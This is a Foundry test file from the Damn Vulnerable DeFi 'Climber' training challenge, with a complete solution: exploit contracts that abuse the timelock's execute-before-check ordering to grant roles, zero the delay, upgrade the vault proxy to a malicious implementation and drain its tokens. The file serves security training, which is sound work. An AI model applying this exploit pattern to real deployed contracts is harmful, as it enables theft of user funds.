// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock} from "../../src/climber/ClimberTimelock.sol";
import {ADMIN_ROLE, PROPOSER_ROLE} from "../../src/climber/ClimberConstants.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()),
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper))
                )
            )
        );

        timelock = ClimberTimelock(payable(vault.owner()));

        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /// CODE YOUR SOLUTION HERE
    function test_climber() public checkSolvedByPlayer {
        ClimberVaultExploit impl = new ClimberVaultExploit();
        ClimberScheduleRelay relay = new ClimberScheduleRelay(); // 创建一个relay合约，用于调用schedule函数
        bytes32 salt = keccak256("climber");

        (address[] memory targets, bytes[] memory data) =
            ClimberBatch.pack(timelock, vault, address(relay), address(token), recovery, impl, salt);
        timelock.execute(targets, new uint256[](5), data, salt);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract ClimberVaultExploit is ClimberVault {
    function drain(address token, address to) external onlyOwner {
        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }
}

library ClimberBatch {
    function pack(
        ClimberTimelock timelock,
        ClimberVault vault,
        address relay,
        address token,
        address recovery,
        ClimberVaultExploit impl,
        bytes32 salt
    ) internal pure returns (address[] memory targets, bytes[] memory data) {
        targets = new address[](5);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = relay;
        targets[3] = address(vault);
        targets[4] = address(vault);

        data = new bytes[](5);
        data[0] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, relay)); // 为了可以使用schedule函数
        data[1] = abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0)));        // 更新delay为0，可以立即执行
        data[2] = abi.encodeCall(
            ClimberScheduleRelay.schedule,
            (timelock, vault, token, recovery, impl, salt)
        );
        data[3] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(impl), bytes("")));
        data[4] = abi.encodeCall(ClimberVaultExploit.drain, (token, recovery));
    }
}

contract ClimberScheduleRelay {
    function schedule(
        ClimberTimelock timelock,
        ClimberVault vault,
        address token,
        address recovery,
        ClimberVaultExploit impl,
        bytes32 salt
    ) external {
        (address[] memory targets, bytes[] memory data) =
            ClimberBatch.pack(timelock, vault, address(this), token, recovery, impl, salt);
        timelock.schedule(targets, new uint256[](5), data, salt);
    }
}
